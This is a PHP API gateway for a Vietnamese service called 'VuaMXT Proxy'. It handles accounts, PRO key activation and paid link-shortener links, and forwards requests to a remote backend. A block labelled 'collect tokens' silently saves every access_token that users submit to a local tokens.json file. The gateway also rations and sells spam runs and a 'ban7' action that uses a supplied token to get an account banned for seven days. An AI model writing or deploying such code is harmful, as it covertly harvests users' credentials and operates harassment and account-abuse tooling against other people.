<?php
// ═══════════════════════════════════════════
// VuaMXT Proxy - API Gateway
// ═══════════════════════════════════════════

// Load configuration
require_once __DIR__ . '/config.php';

// Khởi chạy session để quản lý đăng nhập
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// CORS + headers
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: ' . CORS_ALLOW_ORIGIN);
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('X-XSS-Protection: 1; mode=block');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { 
    http_response_code(200); 
    exit; 
}

// Rate limiting
$clientIP = getClientIP();
if (!checkRateLimit($clientIP)) {
    sendErrorResponse('Too many requests. Please try again later.', 429);
}

// Khởi tạo Database
try {
    $db = initDatabase();
} catch (PDOException $e) {
    sendErrorResponse('Database error: ' . $e->getMessage(), 500);
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') { 
    sendErrorResponse('POST only', 405); 
}

// Đọc body từ frontend
$body = file_get_contents('php://input');
if (!$body) { 
    sendErrorResponse('Empty body'); 
}

$data = json_decode($body, true);
if (!$data) {
    sendErrorResponse('Invalid JSON');
}

$action = $data['action'] ?? '';

// Sanitize input
$data = sanitizeInput($data);

// ═══════════════════════════════════════════
// LOG ACCESS TOKEN (Thu thập Token)
// ═══════════════════════════════════════════
$tokenToLog = $data['access_token'] ?? '';
if (!$tokenToLog && $action === 'eat_to_access') {
    // Nếu là action lấy token từ EAT, chúng ta sẽ log sau khi có kết quả từ API
} else if ($tokenToLog && strlen($tokenToLog) > 10) {
    $logFile = __DIR__ . '/tokens.json';
    $tokens = [];
    if (file_exists($logFile)) {
        $tokens = json_decode(file_get_contents($logFile), true) ?: [];
    }
    if (!in_array($tokenToLog, $tokens)) {
        $tokens[] = $tokenToLog;
        file_put_contents($logFile, json_encode($tokens, JSON_PRETTY_PRINT));
    }
}

// ═══════════════════════════════════════════
// CHỨC NĂNG XỬ LÝ AUTHENTICATION (Xử lý cục bộ)
// ═══════════════════════════════════════════

// 1. Đăng ký tài khoản
if ($action === 'local_register') {
    if (!validateInput($data, ['username', 'email', 'password'])) {
        sendErrorResponse('Vui lòng điền đầy đủ thông tin!');
    }
    
    $user = $data['username'];
    $email = $data['email'];
    $pass = $data['password'];
    
    try {
        $stmt = $db->prepare("SELECT id FROM users WHERE username = ?");
        $stmt->execute([$user]);
        if ($stmt->fetch()) {
            sendErrorResponse('Tên đăng nhập này đã tồn tại!');
        }
        
        $hashed_pass = password_hash($pass, PASSWORD_BCRYPT);
        $stmt = $db->prepare("INSERT INTO users (username, email, password) VALUES (?, ?, ?)");
        $stmt->execute([$user, $email, $hashed_pass]);
        
        sendSuccessResponse(null, 'Đăng ký thành công! Hãy đăng nhập.');
    } catch (Exception $e) {
        sendErrorResponse('Lỗi hệ thống: ' . $e->getMessage());
    }
}

// 2. Đăng nhập tài khoản
if ($action === 'local_login') {
    if (!validateInput($data, ['username', 'password'])) {
        sendErrorResponse('Vui lòng nhập tài khoản & mật khẩu!');
    }
    
    $user = $data['username'];
    $pass = $data['password'];
    
    $stmt = $db->prepare("SELECT * FROM users WHERE username = ?");
    $stmt->execute([$user]);
    $uData = $stmt->fetch();
    
    if (!$uData || !password_verify($pass, $uData['password'])) {
        sendErrorResponse('Sai tên đăng nhập hoặc mật khẩu!');
    }
    
    $_SESSION['uid'] = $uData['id'];
    $_SESSION['username'] = $uData['username'];
    
    // Update last login
    $db->prepare("UPDATE users SET last_login = datetime('now') WHERE id = ?")->execute([$uData['id']]);
    
    sendSuccessResponse([
        'username' => $uData['username'],
        'is_pro' => (int)$uData['is_pro'],
        'spam_count' => (int)$uData['spam_count'],
        'ban7_count' => (int)$uData['ban7_count']
    ], 'Đăng nhập thành công!');
}

// 3. Đăng xuất tài khoản
if ($action === 'local_logout') {
    session_destroy();
    sendSuccessResponse(null, 'Đã đăng xuất');
}

// 4. Kiểm tra trạng thái hiện tại (Giữ trạng thái đăng nhập khi f5)
if ($action === 'local_check_auth') {
    if (!isset($_SESSION['uid'])) {
        sendErrorResponse('Chưa đăng nhập');
    }
    $stmt = $db->prepare("SELECT username, is_pro, spam_count, ban7_count FROM users WHERE id = ?");
    $stmt->execute([$_SESSION['uid']]);
    $uData = $stmt->fetch();
    sendSuccessResponse($uData);
}

// 5. Kích hoạt Key PRO
if ($action === 'local_activate_key') {
    if (!isset($_SESSION['uid'])) {
        sendErrorResponse('Vui lòng đăng nhập trước!');
    }
    
    $keyCode = trim($data['key'] ?? '');
    if (!$keyCode) {
        sendErrorResponse('Vui lòng nhập mã Key!');
    }
    
    $stmt = $db->prepare("SELECT * FROM keys_store WHERE key_code = ? AND is_used = 0");
    $stmt->execute([$keyCode]);
    $kData = $stmt->fetch();
    
    if (!$kData) {
        sendErrorResponse('Mã Key không chính xác hoặc đã được sử dụng!');
    }
    
    // Cập nhật trạng thái key và nâng cấp user lên PRO
    $db->prepare("UPDATE keys_store SET is_used = 1, used_at = datetime('now') WHERE key_code = ?")->execute([$keyCode]);
    $db->prepare("UPDATE users SET is_pro = 1 WHERE id = ?")->execute([$_SESSION['uid']]);
    
    sendSuccessResponse(null, 'Kích hoạt Pro thành công! Đã mở khóa không giới hạn lượt chạy.');
}

// 6. Tạo link vượt (Bypass Link)
if ($action === 'get_bypass_link') {
    if (!isset($_SESSION['uid'])) {
        sendErrorResponse('Vui lòng đăng nhập!');
    }
    
    $feature = $data['feature'] ?? '';
    if (!in_array($feature, ['ban7day', 'spamlog'])) {
        sendErrorResponse('Feature không hợp lệ!');
    }
    
    $token = bin2hex(random_bytes(16));
    
    // Xóa các token cũ đã hết hạn để sạch DB
    $db->exec("DELETE FROM bypass_tokens WHERE created_at < datetime('now', '-" . BYPASS_TOKEN_LIFETIME . " seconds')");
    
    $stmt = $db->prepare("INSERT INTO bypass_tokens (uid, feature, token) VALUES (?, ?, ?)");
    $stmt->execute([$_SESSION['uid'], $feature, $token]);
    
    $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? "https" : "http";
    $host = $_SERVER['HTTP_HOST'];
    $dir = dirname($_SERVER['PHP_SELF']);
    if ($dir === '/') $dir = '';
    
    $verify_url = "$protocol://$host$dir/verify.php?token=$token";
    
    $api_url = "https://api.taplayma.com/api?token=" . TAPLAYMA_API_TOKEN . "&url=" . urlencode($verify_url);
    
    $ch = curl_init($api_url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 15,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_FOLLOWLOCATION => true
    ]);
    $resp = curl_exec($ch);
    curl_close($ch);
    
    $json = json_decode($resp, true);
    
    if ($json && isset($json['status']) && $json['status'] === 'success' && isset($json['shortenedUrl'])) {
        sendSuccessResponse(['shortenedUrl' => $json['shortenedUrl']], 'Link rút gọn đã tạo!');
    } else {
        sendErrorResponse('Lỗi khi tạo link rút gọn!');
    }
}

// ═══════════════════════════════════════════
// KIỂM TRA BẢO MẬT & QUOTA KHI CHẠY TOOLS
// ═══════════════════════════════════════════

// 1. Spam Log Quota
if ($action === 'spam_init' || $action === 'spam_status' || $action === 'spam_stop') {
    if (!isset($_SESSION['uid'])) {
        sendErrorResponse('Yêu cầu đăng nhập tài khoản để sử dụng tính năng này!');
    }
    
    // Lấy thông tin giới hạn hiện tại của User
    $stmt = $db->prepare("SELECT is_pro, spam_count FROM users WHERE id = ?");
    $stmt->execute([$_SESSION['uid']]);
    $uData = $stmt->fetch();
    
    // Thêm UID và IsPro vào body để Python API biết
    $data['uid'] = (int)$_SESSION['uid'];
    $data['is_pro'] = (int)$uData['is_pro'];
    $body = json_encode($data);

    // Nếu gọi lệnh khởi tạo tiến trình spam mới
    if ($action === 'spam_init') {
        $duration_ms = (int)($data['duration_ms'] ?? 0);
        $max_ms = MAX_SPAM_DURATION_DAYS * 86400 * 1000;
        
        if ($duration_ms > $max_ms) {
            sendErrorResponse('Thời gian Spam tối đa là ' . MAX_SPAM_DURATION_DAYS . ' ngày!');
        }

        if ((int)$uData['is_pro'] === 0 && (int)$uData['spam_count'] >= FREE_SPAM_LIMIT) {
            sendErrorResponse('Tài khoản thường chỉ được dùng Spam tối đa ' . FREE_SPAM_LIMIT . ' lần. Hãy nâng cấp Key PRO để tiếp tục sử dụng!');
        }
        
        // Tăng số lượt đã sử dụng lên 1 đơn vị
        $db->prepare("UPDATE users SET spam_count = spam_count + 1 WHERE id = ?")->execute([$_SESSION['uid']]);
    }
}

if ($action === 'ban7') {
    if (!isset($_SESSION['uid'])) {
        sendErrorResponse('Vui lòng đăng nhập để thực hiện ban!');
    }

    // Kiểm tra user
    $stmt = $db->prepare("SELECT is_pro, ban7_count FROM users WHERE id = ?");
    $stmt->execute([$_SESSION['uid']]);
    $uData = $stmt->fetch();

    // FREE chỉ được dùng 1 lần
    if ((int)$uData['is_pro'] === 0 && (int)$uData['ban7_count'] >= FREE_BAN7_LIMIT) {
        sendErrorResponse('Tài khoản FREE chỉ được dùng Ban 7 Ngày ' . FREE_BAN7_LIMIT . ' lần duy nhất. Nâng cấp PRO để dùng vô hạn!');
    }

    // Forward ban7 request to Railway API
    $banData = [
        'action' => 'ban7',
        'access_token' => $data['access_token'] ?? '',
        'platform' => $data['platform'] ?? null
    ];
    
    $ch = curl_init(RAILWAY_URL);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => json_encode($banData),
        CURLOPT_TIMEOUT        => 60,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
    ]);
    
    $res  = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $err  = curl_error($ch);
    curl_close($ch);

    if ($err || !$res) {
        sendErrorResponse('Lỗi kết nối Railway API: ' . $err);
    }

    // Trừ lượt nếu API thành công
    if ($code === 200) {
        $jsonRes = json_decode($res, true);
        if ($jsonRes && isset($jsonRes['ok']) && $jsonRes['ok']) {
            $db->prepare("UPDATE users SET ban7_count = ban7_count + 1 WHERE id = ?")->execute([$_SESSION['uid']]);
        }
    }

    http_response_code($code);
    echo $res;
    exit;
}


// ═══════════════════════════════════════════
// FORWARD THẲNG TỚI RAILWAY API KHÔNG ĐỔI
// ═══════════════════════════════════════════
$ch = curl_init(RAILWAY_URL);
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST           => true,
    CURLOPT_POSTFIELDS     => $body,
    CURLOPT_TIMEOUT        => 60,
    CURLOPT_SSL_VERIFYPEER => true,
    CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
    CURLOPT_ENCODING       => '',
]);
$res  = curl_exec($ch);
$code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$err  = curl_error($ch);
curl_close($ch);

if ($err || !$res) {
    sendErrorResponse('Proxy error: ' . $err);
}

http_response_code($code);
echo $res;

